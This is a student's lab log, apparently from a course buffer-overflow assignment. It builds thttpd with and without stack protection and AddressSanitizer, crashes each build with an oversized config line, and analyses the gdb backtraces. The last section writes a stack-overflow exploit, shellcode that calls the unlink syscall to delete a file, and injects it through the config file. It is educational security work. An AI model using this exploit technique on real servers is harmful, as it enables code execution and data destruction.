@@ -1,0 +1,228 @@
+// SmashingLab
+
+Setting Up the Path:
+> export PATH=/usr/local/cs/bin:$PATH
+Then use >which gcc to check whether I have got the right path for gcc.
+
+*Download the tarball, unzip the file, apply the patch manually to the file have been finished in my own OS.
+
+Configuring the make script
+>./configure \
+LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$ (gcc -dumpversion)/lib"
+
+Giving permission to write & read the file:
+> chmod 777 thttpd.c
+
+Then, I need to generate the three files with -SP, -AS, -NO variants.
+> make clean
+> make CFLAGS='-g3 -O2 -fno-inline -fstack-protector-strong'
+> mv src/thttpd src/thttpd-sp
+
+> make clean
+> make CFLAGS='-g3 -O2 -fno-inline -fsanitize=address' 
+> mv src/thttpd src/thttpd-as
+
+> make clean
+> make CFLAGS='-g3 -O2 -fno-inline' 
+> mv src/thttpd src/thttpd-no
+
+Then I need to test the server to see if it runs properly and access the foo.txt.
+> ./thttpd-sp -p 13618 -D
+> curl http://localhost:13618/foo.txt
+
+> ./thttpd-as -p 13619 -D
+> curl http://localhost:13619/foo.txt
+
+> ./thttpd-no -p 13620 -D
+> curl http://localhost:13620/foo.txt
+
+To crash things, I created a .txt file with 100+ characters(40 “port=1 “s) as config.txt. Each of the variants was crashed by this .txt file.
+
+Findng the instructions that crashed thttpd-sp
+> gdb —-args thttpd-sp -p 13618 -D -C config.txt
+> run
+*CRASH*
+> backtrace
+
+Now I have a backtrace for the crash for thttpd-sp.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0015bd16 in ?? () from /lib/libgcc_s.so.1
+(gdb) backtrace
+#0  0x0015bd16 in ?? () from /lib/libgcc_s.so.1
+#1  0x0015c3b2 in _Unwind_Backtrace () from /lib/libgcc_s.so.1
+#2  0x00bd6905 in backtrace () from /lib/libc.so.6
+#3  0x00b4774b in __libc_message () from /lib/libc.so.6
+#4  0x00bd9e4d in __fortify_fail () from /lib/libc.so.6
+#5  0x00bd9dfa in __stack_chk_fail () from /lib/libc.so.6
+#6  0x0804b68f in read_config (filename=<optimized out>) at thttpd.c:1190
+#7  0x726f7000 in ?? ()
+#8  0x00310074 in ?? ()
+#9  0x74726f70 in ?? ()
+#10 0x70003100 in ?? ()
+#11 0x0074726f in ?? ()
+#12 0x6f700031 in ?? ()
+#13 0x31007472 in ?? ()
+#14 0x726f7000 in ?? ()
+#15 0x00310074 in ?? ()
+#16 0x74726f70 in ?? ()
+#17 0x70003100 in ?? ()
+#18 0x0074726f in ?? ()
+#19 0x6f700031 in ?? ()
+#20 0x31007472 in ?? ()
+#21 0x726f7000 in ?? ()
+#22 0x00310074 in ?? ()
+
+To check which instruction caused the crash, I use the GDB:
+> gdb —args thttpd-sp -p 13618 -D -C break.txt
+(gdb) break read_config
+(gdb) run
+(gdb) step
+
+The crash happend at line 1190 of read_config. The instructions are:
+	movq	-8(%rbp), %rax
+	xorq	%fs:40, %rax
+	je	.L158
+the movq instruction puts the value from the canary into eax and then checks if it was changed by the xorq instruction. Since it had been changed by xorq, the stack smashing did happen, and the program terminated with error.
+
+
+Findng the instructions that crashed thttpd-sp
+> gdb —-args thttpd-as -p 13619 -D -C config.txt
+> run
+*CRASH*
+> backtrace
+
+Now I have a backtrace for the crash for thttpd-as.
+
+==19905==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffffffcf04 at pc 0x425dd8 bp 0x7fffffffce60 sp 0x7fffffffce38
+READ of size 939 at 0x7fffffffcf04 thread T0
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000003bc800f867 in ?? () from /lib64/libgcc_s.so.1
+(gdb) backtrace
+#0  0x0000003bc800f867 in ?? () from /lib64/libgcc_s.so.1
+#1  0x0000003bc8010119 in _Unwind_Backtrace () from /lib64/libgcc_s.so.1
+#2  0x00000000004556d5 in __sanitizer::StackTrace::SlowUnwindStack (this=0x3bc1a20930 <_rtld_local+2352>, 
+    this@entry=0x7fffffffc5e0, pc=0, max_depth=256651692336)
+    at ../../../../gcc-4.9.2/libsanitizer/sanitizer_common/sanitizer_linux_libcdep.cc:168
+#3  0x0000000000452a01 in __sanitizer::StackTrace::Unwind (this=0x7fffffffc5e0, max_depth=<optimized out>, 
+    pc=<optimized out>, bp=140737488342624, stack_top=<optimized out>, stack_bottom=<optimized out>, 
+    request_fast_unwind=false) at ../../../../gcc-4.9.2/libsanitizer/sanitizer_common/sanitizer_stacktrace_libcdep.cc:19
+#4  0x000000000044c322 in __asan_report_error (pc=4349400, bp=0, sp=140737488340448, addr=140737488342788, 
+    is_write=144, access_size=939) at ../../../../gcc-4.9.2/libsanitizer/asan/asan_report.cc:776
+#5  0x0000000000425df0 in __interceptor_strchr (
+    str=str@entry=0x7fffffffcea0 "port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port=1 port"..., 
+    c=c@entry=35) at ../../../../gcc-4.9.2/libsanitizer/asan/asan_interceptors.cc:417
+#6  0x0000000000470791 in read_config (filename=<optimized out>) at thttpd.c:1018
+#7  0x20313d74726f7020 in ?? ()
+#8  0x7020313d74726f70 in ?? ()
+#9  0x6f7020313d74726f in ?? ()
+#10 0x726f7020313d7472 in ?? ()
+#11 0x74726f7020313d74 in ?? ()
+#12 0x3d74726f7020313d in ?? ()
+#13 0x313d74726f702031 in ?? ()
+#14 0x20313d74726f7020 in ?? ()
+
+The instruction that caused the crash was:
+	call	__asan_report_load4
+There is a buffer overflow in the shadow memory, and the reporting function detected the overflow and reported the error, then aborted the program.
+
+Findng the instructions that crashed thttpd-no
+> gdb —-args thttpd-no -p 13620 -D -C config.txt
+> run
+*CRASH*
+> backtrace
+
+Now I have a backtrace for the crash for thttpd-no.
+Program received signal SIGSEGV, Segmentation fault.
+0x31007472 in ?? ()
+(gdb) backtrace
+#0  0x31007472 in ?? ()
+#1  0x726f7000 in ?? ()
+#2  0x00310074 in ?? ()
+#3  0x74726f70 in ?? ()
+#4  0x70003100 in ?? ()
+#5  0x0074726f in ?? ()
+#6  0x6f700031 in ?? ()
+#7  0x31007472 in ?? ()
+#8  0x726f7000 in ?? ()
+#9  0x00310074 in ?? ()
+#10 0x74726f70 in ?? ()
+#11 0x70003100 in ?? ()
+#12 0x0074726f in ?? ()
+#13 0x6f700031 in ?? ()
+#14 0x31007472 in ?? ()
+#15 0x726f7000 in ?? ()
+#16 0x00310074 in ?? ()
+#17 0x74726f70 in ?? ()
+#18 0x70003100 in ?? ()
+#19 0x0074726f in ?? ()
+#20 0x6f700031 in ?? ()
+#21 0x31007472 in ?? ()
+#22 0x726f7000 in ?? ()
+
+The instruction that caused the crash was “ret”
+The program tried to return the memory address from my config.txt.
+There was an error accesing the memory address and thus the porgram crashed.
+
+To generate assembly language for variants:
+> make clean
+> make CFLAGS='-S -O2 -fno-inline -fstack-protector-strong'
+> mv src/thttpd.o src/thttpd-sp.s
+
+> make clean
+> make CFLAGS='-S -O2 -fno-inline -static-libasan -fsanitize=address'
+> mv src/thttpd.o src/thttpd-as.s
+
+>make clean
+> make CFLAGS='-S -O2 -fno-inline'
+> mv src/thttpd.o src/thttpd-no.s
+
+The only different between the SP variant and the NO variant was some labels and line numbers for the jump instructions. Basically, there was no difference at instruction level for the handle_read.
+
+The reason is that the -fstack-protector-strong option only generates canaries for functions declaring data types or length for a local array. Since handle_read did not do the two things, the function does not cause -fstack-protector-strong to create canaries. Also, the -NO variant basically does nothing to protect the program, which is the same as the -SP variant does in this case.
+
+As for the difference for the -SP(also -NO) and -AS Variant.
+
+For -fsanitize=address, there are a lot of checks for shadow memory in the handle_read function’s assembly code and if an error is detected, there are calls to a reporting function like	call	__asan_report_load4. 
+
+Building the Exploit
+
+To generate the file thttpd-exploit file
+> make clean
+> make CFLAGS=‘-g3 -O2 -fno-inline -z execstack’
+> mv src/thttpd src/thttpd-exploit
+
+Essentially, I want to trigger the unlink function in the file and pass the unlink function in the argument of target.txt. So I need to get the address of the function unlink.
+
+Finding addresses:
+> gdb —args thttpd-exploit -p 13620 -D -C exploit.txt
+(gdb) break read_config
+(gdb) run
+(gdb) step
+(gdb) print (int *) line
+(gdb) print remove
+
+Thus, I got the address for the buffer, 0x7fffffffcfb0.
+
+According to the syscall tabel, the system calls unlink if %rax=87, %rdi=the address of the file target.txt. Hence we need the adress of the target.txt by the following command:
+> gdb —-args thttpd-exploit -p 13620 -D -C target.txt
+(gdb) break read_config
+(gdb) run
+(gdb) info registers $rdi
+
+The address is 0x7fffffffeea0.
+
+So the necessary instruction to delete the file will be:
+
+movq $87, %rax
+movq 0x7fffffffeea0, %rdi
+syscall
+
+Then I use the command
+>gcc -c exploit.s
+>objdump -d exploit.s
+to convert the instructions to the bytes.
+
+Then use hex2raw to convert the bytes into hexbytes, put it into myconfig file and my target.txt was deleted.
+
